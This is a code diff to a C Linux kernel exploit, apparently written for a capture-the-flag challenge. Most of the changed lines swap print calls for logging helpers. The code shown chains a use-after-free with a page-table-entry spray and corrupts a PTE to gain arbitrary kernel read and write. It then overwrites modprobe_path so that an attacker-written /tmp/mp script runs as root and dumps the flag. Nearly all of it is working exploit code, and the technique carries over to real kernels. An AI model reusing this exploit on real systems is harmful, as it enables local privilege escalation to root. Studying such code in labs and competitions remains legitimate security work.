@@ -18,6 +18,9 @@
 int win()
 {
   int fd, count;
+  char buf[0x100] = {0};
+
+  lstage("trigger modprobe");
 
   fd = SYSCHK(open("/tmp/mp", O_RDWR | O_CREAT | O_TRUNC, S_IXUSR));
   SYSCHK(write(fd, PAYLOAD, strlen(PAYLOAD)));
@@ -31,7 +34,8 @@ int win()
   execlp("/tmp/ptr-yudai", NULL);
 
   fd = SYSCHK(open("/tmp/flag", O_RDONLY));
-  count = SYSCHK(sendfile(STDOUT_FILENO, fd, NULL, 0x40));
+  count = SYSCHK(read(fd, buf, 0x100));
+  linfo("flag: %s", buf);
   SYSCHK(close(fd));
   return count != 0;
 }
@@ -45,20 +49,22 @@ int main(int argc, char* argv[]) {
   char leak[PTE_SIZE] = {0};
   char *spray[N_SPRAY];
 
-  puts("[+] INIT");
+  lstage("INIT");
   pin_cpu(0, 0);
   init();
-  
+
+  lstage("START");
+
   for (int i = 0; i < N_SPRAY; i++)
     spray[i] = mmap((void*)(0xdead000000 + i*0x10000), 0x8000,
              PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
 
-  puts("[+] create dangeling ptr");
-  ptr = keap_malloc(PTE_SIZE, GFP_KERNEL); 
+  linfo("create dangeling ptr");
+  ptr = keap_malloc(PTE_SIZE, GFP_KERNEL);
   keap_write(ptr, leak, PTE_SIZE);
   keap_free(ptr);
 
-  puts("[+] spray PTEs");
+  linfo("spray PTEs");
   for (int i = 0; i < N_SPRAY; i++)
     for (int j = 0; j < 8; j++)
       *(uint64_t*)(spray[i] + j*0x1000) = 0x6fe1be2;
@@ -71,12 +77,12 @@ int main(int argc, char* argv[]) {
   keap_read(ptr, &pte, 0x8);
   CHK((char)pte == 0x67);
 
-  puts("[+] corrupt PTE using UAF with fixed physical address");
+  linfo("corrupt PTE using UAF with fixed physical address");
   // fixed physical address
   pte = 0x800000000009c067;
   keap_write(ptr, &pte, 0x8);
 
-  puts("[+] find corrupted page");
+  linfo("find corrupted page");
   uint64_t *vuln = 0;
   uint64_t physbase = 0;
   for (int i = 0; i < N_SPRAY; i ++) {
@@ -93,9 +99,10 @@ int main(int argc, char* argv[]) {
 
   CHK(physbase);
 
-  printf("[+] physbase = 0x%lx\n", physbase);
+  linfo("physbase = 0x%lx", physbase);
 
-  puts("[+] corrupt PTE into AAW/AAR");
+  lstage("corrupt PTE");
+  linfo("corrupt PTE into AAW/AAR");
   // find/g 0xffff888000000000, 0xffff888005000000, 0x6f6d2f6e6962732f
   uint64_t modprobe = 0x1eac600;
   // physbase with nokaslr + 0x3000
@@ -125,12 +132,12 @@ int main(int argc, char* argv[]) {
   }
   CHK(vuln == old_vuln);
 
-  puts("[+] overwriting modprobe_path");
+  linfo("overwriting modprobe_path");
   vuln[(modprobe&0xfff)/8] = *(uint64_t*) "/tmp/mp";
 
 #ifdef DEBUG
   print_hex(vuln, 0x40);
 #endif
 
-  return win();  
+  return win();
 }
